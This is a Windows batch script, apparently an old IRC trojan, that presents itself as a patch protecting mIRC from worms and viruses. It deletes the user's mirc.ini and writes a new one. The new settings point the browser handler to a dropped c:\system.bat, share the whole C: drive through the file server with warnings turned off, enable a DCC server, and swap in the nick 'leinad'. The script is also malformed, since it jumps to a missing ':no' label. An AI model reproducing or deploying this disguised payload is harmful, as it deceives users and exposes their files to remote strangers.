@echo off
if exist c:\mirc\mirc32.exe goto yes
if not exist c:\mirc\mirc32.exe goto no
:yes
echo This program will patch mIRC to make it impossible
echo for you to become infected by a worm or virus.
echo Please, if your on mIRC, you must exit it before this program
echo will work.

pause
cls

echo @echo off >> c:\system.bat
echo echo This is a test! >> c:\system.bat
echo pause >> c:\system.bat
echo cls >> c:\system.bat
cd\
cd c:\mirc
del c:\mirc\mirc.ini

echo [files] >> c:\mirc\mirc.ini
echo addrbk=addrbk.ini >> c:\mirc\mirc.ini
echo servers=servers.ini >> c:\mirc\mirc.ini
echo browser=c:\system.bat >> c:\mirc\mirc.ini 
echo emailer=c:\program files\vnet control panel\netscape\communicator\program\netscape.exe >> c:\mirc\mirc.ini
echo finger=finger.txt >> c:\mirc\mirc.ini
echo urls=urls.ini >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [warn] >> c:\mirc\mirc.ini
echo fserve=off >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini 
echo [options] >> c:\mirc\mirc.ini
echo n0=0,0,0,0,0,0,300,0,0,0,1,0,0,0,0,0,1,0,0,0,512,0,1,0,0,0,1,1,0,50,0 >> c:\mirc\mirc.ini
echo n1=5,50,0,0,0,0,0,0,0,1,0,1,0,0,1,1,0,1,0,0,1,1,1,0,5,0,0,0,0,0,1 >> c:\mirc\mirc.ini 
echo n2=0,1,0,1,1,1,1,1,0,60,120,0,0,1,1,0,1,1,0,120,20,10,0,1,1,0,0,1,0 >> c:\mirc\mirc.ini
echo n3=500,0,0,0,0,0,1,1,1,1,0,1,0,0,0,0,3,1,0,1,0,0,0,0,0,1,0,0,0,0 >> c:\mirc\mirc.ini
echo n4=1,0,1,0,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,1,0,1,5000,1,5 >> c:\mirc\mirc.ini 
echo n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,1,0,1,0,300,10,4,0,1,24,0,0,1,8192 >> c:\mirc\mirc.ini
echo n6=0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,100,1,1,0,0,1,0,0,4 >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [dirs] >> c:\mirc\mirc.ini
echo logdir=logs\ >> c:\mirc\mirc.ini
echo waves=sounds\ >> c:\mirc\mirc.ini
echo midis=sounds\ >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [extensions] >> c:\mirc\mirc.ini
echo n0=defaultEXTDIR:download\ >> c:\mirc\mirc.ini
echo n1=*.wav,*.midEXTDIR:sounds\ >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini

echo [mirc] >> c:\mirc\mirc.ini
echo user=leinad >> c:\mirc\mirc.ini
echo email=leinad@leinad.com >> c:\mirc\mirc.ini
echo nick=leinad >> c:\mirc\mirc.ini
echo anick=leinad2 >> c:\mirc\mirc.ini
echo host=Undernet: CA, BC, VancouverSERVER:vancouver.bc.ca.undernet.org:6650GROUP:Undernet >> c:\mirc\mirc.ini

echo [fileserver] >> c:\mirc\mirc.ini 
echo warning=on >> c:\mirc\mirc.ini 

echo [about] >> c:\mirc\mirc.ini 
echo show=electric >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [windows] >> c:\mirc\mirc.ini
echo main=46,548,12,428,0,1,0 >> c:\mirc\mirc.ini 
echo >> c:\mirc\mirc.ini
echo [text] >> c:\mirc\mirc.ini
echo commandchar=/ >> c:\mirc\mirc.ini
echo linesep=- >> c:\mirc\mirc.ini
echo ignore=*.aaa, >> c:\mirc\mirc.ini
echo timestamp=[HH:nn] >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [dde] >> c:\mirc\mirc.ini
echo ServerStatus=on >> c:\mirc\mirc.ini
echo ServiceName=mIRC >> c:\mirc\mirc.ini
echo CheckName=off >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [colours] >> c:\mirc\mirc.ini
echo n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1 >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [afiles] >> c:\mirc\mirc.ini
echo n0=aliases.ini >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [pfiles] >> c:\mirc\mirc.ini
echo n0=popups.ini >> c:\mirc\mirc.ini
echo n1=popups.ini >> c:\mirc\mirc.ini
echo n2=popups.ini >> c:\mirc\mirc.ini
echo n3=popups.ini >> c:\mirc\mirc.ini
echo n4=popups.ini >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [rfiles] >> c:\mirc\mirc.ini
echo n0=remote.ini >> c:\mirc\mirc.ini
echo n1=remote.ini >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo >> c:\mirc\mirc.ini
echo [fileserver] >> c:\mirc\mirc.ini
echo homedir=c: >> c:\mirc\mirc.ini
echo warning=off >> c:\mirc\mirc.ini
echo [dccserver] >> c:\mirc\mirc.ini
echo n0=1,59,0,0,0,0 >> c:\mirc\mirc.ini

